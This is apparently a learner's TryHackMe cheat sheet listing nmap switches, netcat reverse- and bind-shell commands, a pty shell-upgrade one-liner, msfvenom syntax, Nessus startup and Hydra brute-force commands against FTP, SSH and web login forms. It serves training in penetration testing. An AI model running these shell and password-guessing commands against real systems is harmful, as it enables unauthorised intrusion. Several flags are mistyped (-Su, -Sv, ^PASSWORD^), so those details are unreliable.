# TryHackMe - Cheat Sheet

## NMAP (-NMAP)

### Basic Switches

- -`sT` TCP Connect Scans 
- `-sS` SYN "Half-open" Scans 
- `-Su` UDP Scans (-sU)
- `-O`  Operating System
- `-Sv` Services that are running.

### Output Types

- `-oA` Three major formats
- `-oN` Normal format
- `-oG` Grepable format

## Netcat (-NC)

### Reverse Shells

`nc -lvnp <port-number>`

- `-l` is used to tell netcat that this will be a listener
- `-v` is used to request a verbose output
- `-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
- `-p `indicates that the port specification will follow.

### Bind Shells

`nc <target-ip> <chosen-port>`

### Netcat Shell Stabilisation

- Uses Python to spawn a better featured bash shell. `python -c 'import pty;pty.spawn("/bin/bash")'` 
- Give commands such as clear `export TERM=xterm` 
- Background the shell using Ctrl + Z. Back in own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

## Python3 (-python or -python3)

### Web Server

Format for a Python3 web server `sudo python3 -m http.server 80`

## Msfvenom (-msfvenom)

Standard format for msfvenom `msfvenom -p <PAYLOAD> <OPTIONS>`

## Nessus (Vulnerability scanner)

### Basic Commands

Start Service `sudo /bin/systemctl start nessusd.service`

### Navigation & Scanning

- Which hosts are alive: host discovery
- Scan suitable for any host: Basic network scan
- Authenticate to hosts and enumerate missing update: Credentialed Patch Audit
- Scan for web applications: Web applications tests

## Hydra (-Hydra)

### Hydra Commands

- For FTP: `hydra -l user -P passlist.txt ftp://MACHINE_IP`
- For SSH: `hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`
  - `-l` Username
  - `-P` Use a list of passwords
  - `-t` Number of threads to use
 -  Web Forum: `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/LOGIN_URL(Example /login):username=^USER^&password=^PASS^:F=incorrect" -V`
    - `-l` Sinlge Usnermae
    - `-P` Password List
    - `http-post-form` Type of form (post)
    - `/login url` 
    - `:username` The form field where the username is entered
    - `^USER^` Tell Hydra to use the username    
    - `:password` The form field where the password is entered
    - `^PASSWORD^` Tell Hydra to use the password
    - `-V` Verborse output for every attempt 
  - `ssh username@IP`  SSH Login 




